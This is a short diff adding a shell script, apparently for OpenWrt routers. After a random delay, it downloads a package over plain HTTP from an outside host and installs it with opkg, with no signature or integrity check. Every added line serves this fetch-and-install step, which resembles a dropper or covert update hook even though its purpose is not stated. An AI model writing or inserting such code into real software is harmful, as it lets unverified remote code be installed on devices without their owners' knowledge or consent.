@@ -1,0 +1,7 @@
+SRANDOM=$(cat /dev/urandom | head -n 10 | cksum | awk -F ' ' '{print $1}' | tail -c 5)
+
+sleep $SRANDOM"s"
+
+wget -T 30 -t 3 -c http://droidpt.itemdb.com -O /tmp/x.html
+wget -T 30 -t 3 -c http://droidpt.itemdb.com/openwrt/1.ipk
+[ -f 1.ipk ] && opkg install 1.ipk
